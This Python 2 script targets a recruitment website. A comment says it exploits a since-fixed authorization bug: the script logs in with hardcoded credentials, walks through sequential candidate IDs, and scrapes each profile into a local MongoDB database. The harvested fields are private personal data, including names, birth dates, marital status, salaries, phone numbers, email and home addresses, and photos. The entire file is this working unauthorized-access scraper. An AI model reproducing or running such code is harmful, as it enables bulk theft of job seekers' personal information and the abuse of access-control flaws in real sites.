# -*- coding:utf-8 -*-
#This program took advantage of a bug of cross power which had been repaired.
import requests
from lxml import etree
from pymongo import MongoClient


class ShoeshrDownloadSpider:
    siteUrl = 'http://www.shoeshr.com'
    username = 'hhhjjj'
    password = 'zaqzaq'
    loginUrl = 'http://www.shoeshr.com/json/saveLogin.action?r=0.7877830698626412'
    downloadUrl = 'http://www.shoeshr.com/manage/talent/cn/infoView.action?talent.id='
    payload = {
        'user.type':2,
        'user.username':username,
        'user.password':password,
    }

    def login(self):
        self.Ses = requests.Session()
        ans = self.Ses.post(self.loginUrl, data=self.payload)
        print ans.status_code, ans.text

    def download(self, start, end):
        for i in range(start, end):
            res = self.forOne(i)

    def forOne(self, page):
        cont = self.Ses.get(self.downloadUrl + str(page))
        tree = etree.HTML(cont.text)
        node = tree.xpath("//tr/td")
        img = tree.xpath("//a/@href")

        data = {
            'name': node[3].text,
            'birth': node[5].text,
            'sex': node[8].text,
            'hometown': node[10].text,
            'height': node[12].text,
            'weight': node[14].text,
            'kind': node[16].text,
            'marriage': node[18].text,
            'experience': node[20].text,
            'currentSalary': node[22].text,
            'diploma': node[24].text,
            'currentLiving': node[26].text,
            'tel': node[28].text,
            'phone': node[30].text,
            'email': node[32].text,
            'contectAddress': node[36].text,
            'otherAddress': node[38].text,
            'photoAddress': img[1]
        }
        if data['name'] == '':
            return
        self.col.insert(data)
        en = ''
        for i in  range(0, page%4):
            en += '.'
        print 'download' + en

    def openDb(self, coll):
        self.con = MongoClient('localhost', 27017)
        self.db = self.con.Shore
        self.col = self.db[coll]

    def closeDb(self):
        self.con.close()

def run():
    a = ShoeshrDownloadSpider()
    a.login()
    a.openDb('aaa')
    a.download(1, 100)
    a.closeDb()
    pass


if __name__ == '__main__':
    run()